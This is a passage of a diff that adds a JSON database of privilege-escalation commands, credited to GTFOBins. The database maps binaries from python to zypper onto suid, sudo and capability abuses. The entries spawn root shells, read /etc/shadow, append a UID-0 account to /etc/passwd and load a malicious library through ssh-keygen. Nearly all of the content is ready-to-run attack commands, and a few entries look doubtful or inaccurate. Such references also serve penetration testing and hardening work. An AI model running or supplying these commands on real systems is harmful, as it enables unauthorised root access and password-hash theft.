+        "commands": ["./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "rake": {
+      "suid": {
+        "commands": ["./rake -p '`/bin/sh -p 1>&0`'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "readelf": {
+      "suid": {
+        "commands": ["./readelf -a @/etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "red": {
+      "suid": {
+        "commands": ["./red /etc/shadow\\nP\\nq"],
+        "description": "Read files"
+      }
+    },
+    "redcarpet": {
+      "suid": {
+        "commands": ["./redcarpet /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "restic": {
+      "suid": {
+        "commands": ["./restic backup -r /tmp/backup --files-from /etc/shadow --verbose"],
+        "description": "Read files via error"
+      }
+    },
+    "rev": {
+      "suid": {
+        "commands": ["./rev /etc/shadow | rev"],
+        "description": "Read files"
+      }
+    },
+    "rlwrap": {
+      "suid": {
+        "commands": ["./rlwrap -H /dev/null /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo rlwrap /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "rpm": {
+      "suid": {
+        "commands": ["./rpm --eval '%{lua:os.execute(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "rpmdb": {
+      "suid": {
+        "commands": ["./rpmdb --eval '%{lua:os.execute(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "rpmquery": {
+      "suid": {
+        "commands": ["./rpmquery --eval '%{lua:os.execute(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "rpmverify": {
+      "suid": {
+        "commands": ["./rpmverify --eval '%{lua:os.execute(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "rsync": {
+      "suid": {
+        "commands": ["./rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"],
+        "description": "Spawn root shell"
+      }
+    },
+    "ruby": {
+      "suid": {
+        "commands": ["./ruby -e 'exec \"/bin/sh -p\"'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ruby -e 'exec \"/bin/sh\"'"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "run-parts": {
+      "suid": {
+        "commands": ["./run-parts --new-session --regex '^sh$' /bin"],
+        "description": "Spawn shell"
+      },
+      "sudo": {
+        "commands": ["sudo run-parts --new-session --regex '^sh$' /bin"],
+        "description": "Spawn root shell"
+      }
+    },
+    "rview": {
+      "suid": {
+        "commands": ["./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "rvim": {
+      "suid": {
+        "commands": ["./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "sash": {
+      "suid": {
+        "commands": ["./sash"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "scanmem": {
+      "suid": {
+        "commands": ["./scanmem\\nshell /bin/sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "scp": {
+      "suid": {
+        "commands": ["TF=$(mktemp); echo 'sh -p 0<&2 1>&2' > $TF; chmod +x $TF; ./scp -S $TF x y:"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo scp -S $TF x y:"],
+        "description": "Spawn root shell"
+      }
+    },
+    "screen": {
+      "suid": {
+        "commands": ["./screen -x"],
+        "description": "Attach to existing session or use for shell"
+      },
+      "sudo": {
+        "commands": ["sudo screen"],
+        "description": "Spawn root shell in screen"
+      }
+    },
+    "script": {
+      "suid": {
+        "commands": ["./script -q /dev/null /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo script -q /dev/null /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "sed": {
+      "suid": {
+        "commands": ["./sed -e '' /etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo sed -n '1e exec sh 1>&0' /etc/hosts"],
+        "description": "Spawn root shell"
+      }
+    },
+    "service": {
+      "suid": {
+        "commands": ["./service ../../bin/sh"],
+        "description": "Spawn shell via path traversal"
+      }
+    },
+    "setarch": {
+      "suid": {
+        "commands": ["./setarch $(arch) /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo setarch $(arch) /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "setfacl": {
+      "suid": {
+        "commands": ["./setfacl -m u:$(id -un):rwx /etc/shadow"],
+        "description": "Grant file access"
+      }
+    },
+    "sftp": {
+      "suid": {
+        "commands": ["./sftp -S /bin/sh -p x:"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo sftp -S /bin/sh x:"],
+        "description": "Spawn root shell"
+      }
+    },
+    "sg": {
+      "suid": {
+        "commands": ["./sg root -c /bin/sh"],
+        "description": "Spawn shell as root group"
+      }
+    },
+    "shuf": {
+      "suid": {
+        "commands": ["./shuf /etc/shadow"],
+        "description": "Read files (shuffled output)"
+      }
+    },
+    "slsh": {
+      "suid": {
+        "commands": ["./slsh -e 'system(\"/bin/sh -p\")'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "smbclient": {
+      "suid": {
+        "commands": ["./smbclient '\\\\server\\share'\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "socat": {
+      "suid": {
+        "commands": ["./socat stdin exec:/bin/sh,-p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo socat stdin exec:/bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "sort": {
+      "suid": {
+        "commands": ["./sort /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "split": {
+      "suid": {
+        "commands": ["./split /etc/shadow prefix; cat prefix*"],
+        "description": "Read files"
+      }
+    },
+    "sqlite3": {
+      "suid": {
+        "commands": ["./sqlite3 /dev/null '.shell /bin/sh -p'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo sqlite3 /dev/null '.shell /bin/sh'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "ss": {
+      "suid": {
+        "commands": ["./ss -F /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "ssh": {
+      "suid": {
+        "commands": ["./ssh -o ProxyCommand='/bin/sh -p -c \"sh -p 0<&2 1>&2\"' x"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ssh -o ProxyCommand='/bin/sh -c \"sh 0<&2 1>&2\"' x"],
+        "description": "Spawn root shell"
+      }
+    },
+    "ssh-keygen": {
+      "suid": {
+        "commands": ["./ssh-keygen -D ./malicious.so"],
+        "description": "Load malicious library"
+      }
+    },
+    "ssh-keyscan": {
+      "suid": {
+        "commands": ["./ssh-keyscan -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "sshpass": {
+      "suid": {
+        "commands": ["./sshpass -p password /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "start-stop-daemon": {
+      "suid": {
+        "commands": ["./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "stdbuf": {
+      "suid": {
+        "commands": ["./stdbuf -i0 /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo stdbuf -i0 /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "strace": {
+      "suid": {
+        "commands": ["./strace -o /dev/null /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo strace -o /dev/null /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "strings": {
+      "suid": {
+        "commands": ["./strings /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "su": {
+      "sudo": {
+        "commands": ["sudo su"],
+        "description": "Spawn root shell"
+      }
+    },
+    "sysctl": {
+      "suid": {
+        "commands": ["./sysctl -n \"/../../etc/shadow\""],
+        "description": "Read files via path traversal"
+      }
+    },
+    "systemctl": {
+      "suid": {
+        "commands": ["./systemctl\\n!sh -p"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo systemctl\\n!sh"],
+        "description": "Escape to root shell"
+      }
+    },
+    "tac": {
+      "suid": {
+        "commands": ["./tac /etc/shadow"],
+        "description": "Read files (reversed)"
+      }
+    },
+    "tail": {
+      "suid": {
+        "commands": ["./tail /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "tar": {
+      "suid": {
+        "commands": ["./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
+        "description": "Spawn shell via checkpoint"
+      },
+      "sudo": {
+        "commands": ["sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "taskset": {
+      "suid": {
+        "commands": ["./taskset 1 /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo taskset 1 /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "tbl": {
+      "suid": {
+        "commands": ["./tbl /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "tclsh": {
+      "suid": {
+        "commands": ["./tclsh\\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo tclsh\\nexec /bin/sh <@stdin >@stdout 2>@stderr"],
+        "description": "Spawn root shell"
+      }
+    },
+    "tee": {
+      "suid": {
+        "commands": ["echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' | ./tee -a /etc/passwd"],
+        "description": "Write to files (append)"
+      },
+      "sudo": {
+        "commands": ["echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd"],
+        "description": "Append to system files"
+      }
+    },
+    "telnet": {
+      "suid": {
+        "commands": ["./telnet\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "tex": {
+      "suid": {
+        "commands": ["./tex '\\input{|/bin/sh}'"],
+        "description": "Spawn shell (may require interaction)"
+      }
+    },
+    "tftp": {
+      "suid": {
+        "commands": ["./tftp localhost\\nget /etc/shadow"],
+        "description": "Read files via TFTP"
+      }
+    },
+    "tic": {
+      "suid": {
+        "commands": ["./tic -C /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "time": {
+      "suid": {
+        "commands": ["./time /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo time /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "timeout": {
+      "suid": {
+        "commands": ["./timeout 7d /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo timeout 7d /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "tmux": {
+      "suid": {
+        "commands": ["./tmux"],
+        "description": "Spawn shell in tmux"
+      },
+      "sudo": {
+        "commands": ["sudo tmux"],
+        "description": "Spawn root shell in tmux"
+      }
+    },
+    "top": {
+      "suid": {
+        "commands": ["./top\\n:!sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "troff": {
+      "suid": {
+        "commands": ["./troff /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "ul": {
+      "suid": {
+        "commands": ["./ul /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "unexpand": {
+      "suid": {
+        "commands": ["./unexpand /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "uniq": {
+      "suid": {
+        "commands": ["./uniq /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "unshare": {
+      "suid": {
+        "commands": ["./unshare -r /bin/sh"],
+        "description": "Spawn root shell in namespace"
+      },
+      "sudo": {
+        "commands": ["sudo unshare /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "unsquashfs": {
+      "suid": {
+        "commands": ["./unsquashfs /dev/stdin < image.squashfs"],
+        "description": "Extract filesystem"
+      }
+    },
+    "update-alternatives": {
+      "suid": {
+        "commands": ["./update-alternatives --force --install /tmp/x x /bin/sh 1\\n/tmp/x -p"],
+        "description": "Create symlink to shell"
+      }
+    },
+    "uudecode": {
+      "suid": {
+        "commands": ["./uudecode /dev/stdin"],
+        "description": "Decode files"
+      }
+    },
+    "uuencode": {
+      "suid": {
+        "commands": ["./uuencode /etc/shadow /dev/stdout | uudecode -o /dev/stdout"],
+        "description": "Read files"
+      }
+    },
+    "valgrind": {
+      "suid": {
+        "commands": ["./valgrind /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "view": {
+      "suid": {
+        "commands": ["./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo view -c ':!/bin/sh'"],
+        "description": "Escape to root shell"
+      }
+    },
+    "vigr": {
+      "suid": {
+        "commands": ["./vigr"],
+        "description": "Edit group file"
+      }
+    },
+    "vim": {
+      "suid": {
+        "commands": [
+          "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
+          "./vim -c ':!/bin/sh -p'"
+        ],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo vim -c ':!/bin/sh'"],
+        "description": "Escape to root shell"
+      }
+    },
+    "vimdiff": {
+      "suid": {
+        "commands": ["./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "vipw": {
+      "suid": {
+        "commands": ["./vipw"],
+        "description": "Edit passwd file"
+      }
+    },
+    "watch": {
+      "suid": {
+        "commands": ["./watch -x /bin/sh -p -c 'reset; exec sh -p 1>&0 2>&0'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "wc": {
+      "suid": {
+        "commands": ["./wc --files0-from=/etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "wget": {
+      "suid": {
+        "commands": ["./wget -i /etc/shadow"],
+        "description": "Read files via error"
+      },
+      "sudo": {
+        "commands": ["TF=$(mktemp); chmod +x $TF; echo -e '#!/bin/sh\\n/bin/sh 1>&0' > $TF; sudo wget --use-askpass=$TF 0"],
+        "description": "Spawn root shell"
+      }
+    },
+    "whiptail": {
+      "suid": {
+        "commands": ["./whiptail --textbox /etc/shadow 0 0"],
+        "description": "Read files"
+      }
+    },
+    "wish": {
+      "suid": {
+        "commands": ["./wish\\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "xargs": {
+      "suid": {
+        "commands": ["./xargs -a /dev/null sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo xargs -a /dev/null sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "xdotool": {
+      "suid": {
+        "commands": ["./xdotool exec --sync /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "xelatex": {
+      "suid": {
+        "commands": ["./xelatex '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "xetex": {
+      "suid": {
+        "commands": ["./xetex '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "xmodmap": {
+      "suid": {
+        "commands": ["./xmodmap -v /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "xmore": {
+      "suid": {
+        "commands": ["./xmore /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "xxd": {
+      "suid": {
+        "commands": ["./xxd /etc/shadow | xxd -r"],
+        "description": "Read files"
+      }
+    },
+    "xz": {
+      "suid": {
+        "commands": ["./xz -c /etc/shadow | xz -d"],
+        "description": "Read files"
+      }
+    },
+    "yash": {
+      "suid": {
+        "commands": ["./yash"],
+        "description": "Spawn shell"
+      }
+    },
+    "zip": {
+      "suid": {
+        "commands": ["TF=$(mktemp -u); ./zip $TF /etc/shadow -T -TT 'sh -p #'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "zsh": {
+      "suid": {
+        "commands": ["./zsh"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo zsh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "zsoelim": {
+      "suid": {
+        "commands": ["./zsoelim /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "zypper": {
+      "suid": {
+        "commands": ["./zypper x"],
+        "description": "Interact with package manager"
+      },
+      "sudo": {
+        "commands": ["sudo zypper x\\n!/bin/sh"],
+        "description": "Escape to root shell"
+      }
+    }
+  },
+  "metadata": {
+    "source": "GTFOBins (https://gtfobins.github.io/)",
+    "total_binaries": 206,
+    "categories": ["suid", "sudo", "capabilities"]
+  }
+}
